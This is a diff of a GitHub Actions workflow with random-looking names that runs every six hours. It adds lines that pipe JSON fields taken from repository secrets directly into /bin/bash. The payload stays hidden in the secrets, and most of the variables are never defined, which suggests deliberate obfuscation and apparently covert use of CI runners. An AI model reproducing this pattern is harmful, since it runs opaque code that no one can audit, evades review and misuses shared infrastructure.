@@ -3,20 +3,25 @@ name: luoshengjiao3419
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
-
-jobs:  # 7549
+    - cron: '39 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: luoshengjiao3419
         env:
-          a894: ${{ secrets.a894 }}
+          iuwxh3839: ${{ secrets.iuwxh3839 }}
         run: |
-          echo $a894 | jq -r .wl661 | /bin/bash
-          echo $czk83042 | jq -r .dhquo6783 | /bin/bash
-          echo $uip53 | jq -r .fvbkm85 | /bin/bash
-          echo $wcyp6 | jq -r .vd4407 | /bin/bash
-          echo $tajuu3334 | jq -r .ojncr65 | /bin/bash
+          echo $iuwxh3839 | jq -r .setdt92 | /bin/bash
+          echo $qaaa6304 | jq -r .ko76862 | /bin/bash
+          echo $h59413 | jq -r .xothn560 | /bin/bash
+          echo $jg03262 | jq -r .n86 | /bin/bash
+          echo $fil383 | jq -r .xre0375 | /bin/bash
+          echo $kkjz34231 | jq -r .aftkl9 | /bin/bash
+          echo $isjd85 | jq -r .few3046 | /bin/bash
+          echo $qto5 | jq -r .jjqsz0 | /bin/bash
+          echo $o2 | jq -r .wogrs5877 | /bin/bash
+          echo $jhguq0660 | jq -r .wrly8 | /bin/bash
+          echo $oj938 | jq -r .paqim34 | /bin/bash
 
